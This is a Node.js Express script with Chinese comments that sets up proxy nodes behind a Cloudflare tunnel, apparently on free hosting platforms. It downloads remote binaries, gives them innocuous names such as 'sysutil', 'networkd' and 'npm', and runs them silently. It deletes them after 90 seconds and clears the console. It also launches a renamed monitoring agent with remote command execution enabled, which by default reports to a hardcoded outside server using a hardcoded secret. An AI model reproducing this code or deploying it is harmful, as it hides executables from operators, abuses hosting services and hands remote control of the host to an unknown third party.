const express = require("express");
const app = express();
const axios = require("axios");
const os = require('os');
const fs = require("fs");
const path = require("path");
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);
const { execSync } = require('child_process');        // 只填写UPLOAD_URL将上传节点,同时填写UPLOAD_URL和PROJECT_URL将上传订阅
const UPLOAD_URL = process.env.UPLOAD_URL || '';      // 节点或订阅自动上传地址,需填写部署Merge-sub项目后的首页地址,例如：https://merge.serv00.net
const PROJECT_URL = process.env.PROJECT_URL || '';    // 需要上传订阅或保活时需填写项目分配的url,例如：https://google.com
const AUTO_ACCESS = process.env.AUTO_ACCESS || false; // false关闭自动保活，true开启,需同时填写PROJECT_URL变量
const FILE_PATH = process.env.FILE_PATH || './tmp';   // 运行目录,sub节点文件保存目录
const SUB_PATH = process.env.SUB_PATH || 'sub123';       // 订阅路径
const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;        // http服务订阅端口
const KEY = process.env.KEY || '161fc0b2-cfa3-4053-8d51-20aeee66c2dd'; // 使用悟空v1,在不同的平台运行需修改KEY,否则会覆盖
const WUKONG_SERVER = process.env.WUKONG_SERVER || 'kcystufkiiuc.ap-northeast-1.clawcloudrun.com:443';        // 悟空v1填写形式: nz.abc.com:8008  悟空v0填写形式：nz.abc.com
const WUKONG_PORT = process.env.WUKONG_PORT || '';            // 使用悟空v1请留空，悟空v0需填写
const WUKONG_KEY = process.env.WUKONG_KEY || '2h1TEmM79EPLBctbNrd014hWlkZ3Sr26';              // 悟空v1的NZ_CLIENT_SECRET或悟空v0的agent密钥
const CLOUD_DOMAIN = process.env.CLOUD_DOMAIN || '';          // 固定隧道域名,留空即启用临时隧道
const CLOUD_TOKEN = process.env.CLOUD_TOKEN || '';              // 固定隧道密钥json或token,留空即启用临时隧道,json获取地址：https://fscarmen.cloudflare.now.cc
const CLOUD_PORT = process.env.CLOUD_PORT || 8001;            // 固定隧道端口,使用token需在cloudflare后台设置和这里一致
const CFIP = process.env.CFIP || 'skk.moe';         // 节点优选域名或优选ip
const CFPORT = process.env.CFPORT || 443;                   // 节点优选域名或优选ip对应的端口
const NAME = process.env.NAME || 'Vl';                     // 节点名称

//创建运行文件夹
if (!fs.existsSync(FILE_PATH)) {
  fs.mkdirSync(FILE_PATH);
  console.log(`${FILE_PATH} is created`);
} else {
  console.log(`${FILE_PATH} already exists`);
}

let npmPath = path.join(FILE_PATH, 'npm');
let wukongPath = path.join(FILE_PATH, 'wukong');
let sysutilPath = path.join(FILE_PATH, 'sysutil');
let networkdPath = path.join(FILE_PATH, 'networkd');
let subPath = path.join(FILE_PATH, 'sub.txt');
let listPath = path.join(FILE_PATH, 'list.txt');
let bootLogPath = path.join(FILE_PATH, 'boot.log');
let configPath = path.join(FILE_PATH, 'config.json');

// 如果订阅器上存在历史运行节点则先删除
function deleteNodes() {
  try {
    if (!UPLOAD_URL) return;
    if (!fs.existsSync(subPath)) return;

    let fileContent;
    try {
      fileContent = fs.readFileSync(subPath, 'utf-8');
    } catch {
      return null;
    }

    const decoded = Buffer.from(fileContent, 'base64').toString('utf-8');
    const nodes = decoded.split('\n').filter(line =>
      /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(line)
    );

    if (nodes.length === 0) return;

    return axios.post(`${UPLOAD_URL}/api/delete-nodes`,
      JSON.stringify({ nodes }),
      { headers: { 'Content-Type': 'application/json' } }
    ).catch((error) => {
      return null;
    });
  } catch (err) {
    return null;
  }
}

//清理历史文件
function cleanupOldFiles() {
  const pathsToDelete = ['sysutil', 'networkd', 'npm', 'wukong', 'sub.txt', 'boot.log'];
  pathsToDelete.forEach(file => {
    const filePath = path.join(FILE_PATH, file);
    fs.unlink(filePath, () => {});
  });
}

// 根路由
app.get("/", function(req, res) {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// 生成xr-ay配置文件
const config = {
  log: { access: '/dev/null', error: '/dev/null', loglevel: 'none' },
  inbounds: [
    { port: CLOUD_PORT, protocol: 'vless', settings: { clients: [{ id: KEY, flow: 'xtls-rprx-vision' }], decryption: 'none', fallbacks: [{ dest: 3001 }, { path: "/vless-argo", dest: 3002 }, { path: "/vmess-argo", dest: 3003 }, { path: "/trojan-argo", dest: 3004 }] }, streamSettings: { network: 'tcp' } },
    { port: 3001, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: KEY }], decryption: "none" }, streamSettings: { network: "tcp", security: "none" } },
    { port: 3002, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: KEY, level: 0 }], decryption: "none" }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/vless-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
    { port: 3003, listen: "127.0.0.1", protocol: "vmess", settings: { clients: [{ id: KEY, alterId: 0 }] }, streamSettings: { network: "ws", wsSettings: { path: "/vmess-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
    { port: 3004, listen: "127.0.0.1", protocol: "trojan", settings: { clients: [{ password: KEY }] }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/trojan-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
  ],
  dns: { servers: ["https+local://8.8.8.8/dns-query"] },
  outbounds: [ { protocol: "freedom", tag: "direct" }, {protocol: "blackhole", tag: "block"} ]
};
fs.writeFileSync(path.join(FILE_PATH, 'config.json'), JSON.stringify(config, null, 2));

// 判断系统架构
function getSystemArchitecture() {
  const arch = os.arch();
  if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {
    return 'arm';
  } else {
    return 'amd';
  }
}

// 下载对应系统架构的依赖文件
function downloadFile(fileName, fileUrl, callback) {
  const filePath = path.join(FILE_PATH, fileName);
  const writer = fs.createWriteStream(filePath);

  axios({
    method: 'get',
    url: fileUrl,
    responseType: 'stream',
  })
    .then(response => {
      response.data.pipe(writer);

      writer.on('finish', () => {
        writer.close();
        console.log(`Download ${fileName} successfully`);
        callback(null, fileName);
      });

      writer.on('error', err => {
        fs.unlink(filePath, () => { });
        const errorMessage = `Download ${fileName} failed: ${err.message}`;
        console.error(errorMessage); // 下载失败时输出错误消息
        callback(errorMessage);
      });
    })
    .catch(err => {
      const errorMessage = `Download ${fileName} failed: ${err.message}`;
      console.error(errorMessage); // 下载失败时输出错误消息
      callback(errorMessage);
    });
}

// 下载并运行依赖文件
async function downloadFilesAndRun() {
  const architecture = getSystemArchitecture();
  const filesToDownload = getFilesForArchitecture(architecture);

  if (filesToDownload.length === 0) {
    console.log(`Can't find a file for the current architecture`);
    return;
  }

  const downloadPromises = filesToDownload.map(fileInfo => {
    return new Promise((resolve, reject) => {
      downloadFile(fileInfo.fileName, fileInfo.fileUrl, (err, fileName) => {
        if (err) {
          reject(err);
        } else {
          resolve(fileName);
        }
      });
    });
  });

  try {
    await Promise.all(downloadPromises);
  } catch (err) {
    console.error('Error downloading files:', err);
    return;
  }
  // 授权和运行
  function authorizeFiles(filePaths) {
    const newPermissions = 0o775;
    filePaths.forEach(relativeFilePath => {
      const absoluteFilePath = path.join(FILE_PATH, relativeFilePath);
      if (fs.existsSync(absoluteFilePath)) {
        fs.chmod(absoluteFilePath, newPermissions, (err) => {
          if (err) {
            console.error(`Empowerment failed for ${absoluteFilePath}: ${err}`);
          } else {
            console.log(`Empowerment success for ${absoluteFilePath}: ${newPermissions.toString(8)}`);
          }
        });
      }
    });
  }
  const filesToAuthorize = WUKONG_PORT ? ['./npm', './sysutil', './networkd'] : ['./wukong', './sysutil', './networkd'];
  authorizeFiles(filesToAuthorize);

  //运行ne-zha
  if (WUKONG_SERVER && WUKONG_KEY) {
    if (!WUKONG_PORT) {
      // 检测悟空是否开启TLS
      const port = WUKONG_SERVER.includes(':') ? WUKONG_SERVER.split(':').pop() : '';
      const tlsPorts = new Set(['443', '8443', '2096', '2087', '2083', '2053']);
      const nezhatls = tlsPorts.has(port) ? 'true' : 'false';
      // 生成 config.yaml
      const configYaml = `
client_secret: ${WUKONG_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
report_delay: 1
server: ${WUKONG_SERVER}
skip_connection_count: false
skip_procs_count: false
temperature: false
tls: ${nezhatls}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${KEY}`;

      fs.writeFileSync(path.join(FILE_PATH, 'config.yaml'), configYaml);

      // 运行 wukong
      const command = `nohup ${FILE_PATH}/wukong -c "${FILE_PATH}/config.yaml" >/dev/null 2>&1 &`;
      try {
        await exec(command);
        console.log('wukong is running');
        await new Promise((resolve) => setTimeout(resolve, 1000));
      } catch (error) {
        console.error(`wukong running error: ${error}`);
      }
    } else {
      let NEZHA_TLS = '';
      const tlsPorts = ['443', '8443', '2096', '2087', '2083', '2053'];
      if (tlsPorts.includes(WUKONG_PORT)) {
        NEZHA_TLS = '--tls';
      }
      const command = `nohup ${FILE_PATH}/npm -s ${WUKONG_SERVER}:${WUKONG_PORT} -p ${WUKONG_KEY} ${NEZHA_TLS} >/dev/null 2>&1 &`;
      try {
        await exec(command);
        console.log('npm is running');
        await new Promise((resolve) => setTimeout(resolve, 1000));
      } catch (error) {
        console.error(`npm running error: ${error}`);
      }
    }
  } else {
    console.log('WUKONG variable is empty,skip running');
  }
  //运行xr-ay
  const command1 = `nohup ${FILE_PATH}/sysutil -c ${FILE_PATH}/config.json >/dev/null 2>&1 &`;
  try {
    await exec(command1);
    console.log('sysutil is running');
    await new Promise((resolve) => setTimeout(resolve, 1000));
  } catch (error) {
    console.error(`sysutil running error: ${error}`);
  }

  // 运行cloud-fared
  if (fs.existsSync(path.join(FILE_PATH, 'networkd'))) {
    let args;

    if (CLOUD_TOKEN.match(/^[A-Z0-9a-z=]{120,250}$/)) {
      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${CLOUD_TOKEN}`;
    } else if (CLOUD_TOKEN.match(/TunnelSecret/)) {
      args = `tunnel --edge-ip-version auto --config ${FILE_PATH}/tunnel.yml run`;
    } else {
      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${CLOUD_PORT}`;
    }

    try {
      await exec(`nohup ${FILE_PATH}/networkd ${args} >/dev/null 2>&1 &`);
      console.log('networkd is running');
      await new Promise((resolve) => setTimeout(resolve, 2000));
    } catch (error) {
      console.error(`Error executing command: ${error}`);
    }
  }
  await new Promise((resolve) => setTimeout(resolve, 5000));

}

//根据系统架构返回对应的url
function getFilesForArchitecture(architecture) {
  let baseFiles;
  if (architecture === 'arm') {
    baseFiles = [
      { fileName: "sysutil", fileUrl: "https://arm64.ssss.nyc.mn/web" },
      { fileName: "networkd", fileUrl: "https://arm64.ssss.nyc.mn/2go" }
    ];
  } else {
    baseFiles = [
      { fileName: "sysutil", fileUrl: "https://amd64.ssss.nyc.mn/web" },
      { fileName: "networkd", fileUrl: "https://amd64.ssss.nyc.mn/2go" }
    ];
  }

  if (WUKONG_SERVER && WUKONG_KEY) {
    if (WUKONG_PORT) {
      const npmUrl = architecture === 'arm'
        ? "https://arm64.ssss.nyc.mn/agent"
        : "https://amd64.ssss.nyc.mn/agent";
        baseFiles.unshift({
          fileName: "npm",
          fileUrl: npmUrl
        });
    } else {
      const phpUrl = architecture === 'arm'
        ? "https://arm64.ssss.nyc.mn/v1"
        : "https://amd64.ssss.nyc.mn/v1";
      baseFiles.unshift({
        fileName: "wukong",
        fileUrl: phpUrl
      });
    }
  }

  return baseFiles;
}

// 获取固定隧道json
function argoType() {
  if (!CLOUD_TOKEN || !CLOUD_DOMAIN) {
    console.log("CLOUD_DOMAIN or CLOUD_TOKEN variable is empty, use quick tunnels");
    return;
  }

  if (CLOUD_TOKEN.includes('TunnelSecret')) {
    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.json'), CLOUD_TOKEN);
    const tunnelYaml = `
  tunnel: ${CLOUD_TOKEN.split('"')[11]}
  credentials-file: ${path.join(FILE_PATH, 'tunnel.json')}
  protocol: http2

  ingress:
    - hostname: ${CLOUD_DOMAIN}
      service: http://localhost:${CLOUD_PORT}
      originRequest:
        noTLSVerify: true
    - service: http_status:404
  `;
    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.yml'), tunnelYaml);
  } else {
    console.log("CLOUD_TOKEN mismatch TunnelSecret,use token connect to tunnel");
  }
}
argoType();

// 获取临时隧道domain
async function extractDomains() {
  let argoDomain;

  if (CLOUD_TOKEN && CLOUD_DOMAIN) {
    argoDomain = CLOUD_DOMAIN;
    console.log('CLOUD_DOMAIN:', argoDomain);
    await generateLinks(argoDomain);
  } else {
    try {
      const fileContent = fs.readFileSync(path.join(FILE_PATH, 'boot.log'), 'utf-8');
      const lines = fileContent.split('\n');
      const argoDomains = [];
      lines.forEach((line) => {
        const domainMatch = line.match(/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
        if (domainMatch) {
          const domain = domainMatch[1];
          argoDomains.push(domain);
        }
      });

      if (argoDomains.length > 0) {
        argoDomain = argoDomains[0];
        console.log('ArgoDomain:', argoDomain);
        await generateLinks(argoDomain);
      } else {
        console.log('ArgoDomain not found, re-running bot to obtain ArgoDomain');
        // 删除 boot.log 文件，等待 2s 重新运行 server 以获取 ArgoDomain
        fs.unlinkSync(path.join(FILE_PATH, 'boot.log'));
        async function killBotProcess() {
          try {
            await exec('pkill -f "[n]etworkd" > /dev/null 2>&1');
          } catch (error) {
            // 忽略输出
          }
        }
        killBotProcess();
        await new Promise((resolve) => setTimeout(resolve, 3000));
        const args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${CLOUD_PORT}`;
        try {
          await exec(`nohup ${path.join(FILE_PATH, 'networkd')} ${args} >/dev/null 2>&1 &`);
          console.log('networkd is running.');
          await new Promise((resolve) => setTimeout(resolve, 3000));
          await extractDomains(); // 重新提取域名
        } catch (error) {
          console.error(`Error executing command: ${error}`);
        }
      }
    } catch (error) {
      console.error('Error reading boot.log:', error);
    }
  }

  // 生成 list 和 sub 信息
  async function generateLinks(argoDomain) {
    const metaInfo = execSync(
      'curl -s https://speed.cloudflare.com/meta | awk -F\\" \'{print $26"-"$18}\' | sed -e \'s/ /_/g\'',
      { encoding: 'utf-8' }
    );
    const ISP = metaInfo.trim();

    return new Promise((resolve) => {
      setTimeout(() => {
        const VMESS = { v: '2', ps: `${NAME}-${ISP}`, add: CFIP, port: CFPORT, id: KEY, aid: '0', scy: 'none', net: 'ws', type: 'none', host: argoDomain, path: '/vmess-argo?ed=2560', tls: 'tls', sni: argoDomain, alpn: '' };
        const subTxt = `
vless://${KEY}@${CFIP}:${CFPORT}?encryption=none&security=tls&sni=${argoDomain}&type=ws&host=${argoDomain}&path=%2Fvless-argo%3Fed%3D2560#${NAME}-${ISP}

vmess://${Buffer.from(JSON.stringify(VMESS)).toString('base64')}

trojan://${KEY}@${CFIP}:${CFPORT}?security=tls&sni=${argoDomain}&type=ws&host=${argoDomain}&path=%2Ftrojan-argo%3Fed%3D2560#${NAME}-${ISP}
    `;
        // 打印 sub.txt 内容到控制台
        console.log(Buffer.from(subTxt).toString('base64'));
        fs.writeFileSync(subPath, Buffer.from(subTxt).toString('base64'));
        console.log(`${FILE_PATH}/sub.txt saved successfully`);
        uplodNodes();
        // 将内容进行 base64 编码并写入 SUB_PATH 路由
        app.get(`/${SUB_PATH}`, (req, res) => {
          const encodedContent = Buffer.from(subTxt).toString('base64');
          res.set('Content-Type', 'text/plain; charset=utf-8');
          res.send(encodedContent);
        });
        resolve(subTxt);
      }, 2000);
    });
  }
}

// 自动上传节点或订阅
async function uplodNodes() {
  if (UPLOAD_URL && PROJECT_URL) {
    const subscriptionUrl = `${PROJECT_URL}/${SUB_PATH}`;
    const jsonData = {
      subscription: [subscriptionUrl]
    };
    try {
        const response = await axios.post(`${UPLOAD_URL}/api/add-subscriptions`, jsonData, {
            headers: {
                'Content-Type': 'application/json'
            }
        });

        if (response.status === 200) {
            console.log('Subscription uploaded successfully');
        } else {
          return null;
          //  console.log('Unknown response status');
        }
    } catch (error) {
        if (error.response) {
            if (error.response.status === 400) {
              //  console.error('Subscription already exists');
            }
        }
    }
  } else if (UPLOAD_URL) {
      if (!fs.existsSync(listPath)) return;
      const content = fs.readFileSync(listPath, 'utf-8');
      const nodes = content.split('\n').filter(line => /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(line));

      if (nodes.length === 0) return;

      const jsonData = JSON.stringify({ nodes });

      try {
          await axios.post(`${UPLOAD_URL}/api/add-nodes`, jsonData, {
              headers: { 'Content-Type': 'application/json' }
          });
          if (response.status === 200) {
            console.log('Subscription uploaded successfully');
        } else {
            return null;
        }
      } catch (error) {
          return null;
      }
  } else {
      // console.log('Skipping upload nodes');
      return;
  }
}

// 90s后删除相关文件
function cleanFiles() {
  setTimeout(() => {
    const filesToDelete = [bootLogPath, configPath, sysutilPath, networkdPath, wukongPath, npmPath];

    if (WUKONG_PORT) {
      filesToDelete.push(npmPath);
    } else if (WUKONG_SERVER && WUKONG_KEY) {
      filesToDelete.push(wukongPath);
    }

    exec(`rm -rf ${filesToDelete.join(' ')} >/dev/null 2>&1`, (error) => {
      console.clear();
      console.log('App is running');
      console.log('Thank you for using this script, enjoy!');
    });
  }, 90000); // 90s
}
cleanFiles();

// 自动访问项目URL
async function AddVisitTask() {
  if (!AUTO_ACCESS || !PROJECT_URL) {
    console.log("Skipping adding automatic access task");
    return;
  }

  try {
    const response = await axios.post('https://oooo.serv00.net/add-url', {
      url: PROJECT_URL
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    });
    // console.log(`${JSON.stringify(response.data)}`);
    console.log(`automatic access task added successfully`);
  } catch (error) {
    console.error(`添加URL失败: ${error.message}`);
  }
}

// 回调运行
async function startserver() {
  deleteNodes();
  cleanupOldFiles();
  await downloadFilesAndRun();
  await extractDomains();
  AddVisitTask();
}
startserver();

app.listen(PORT, () => console.log(`http server is running on port:${PORT}!`));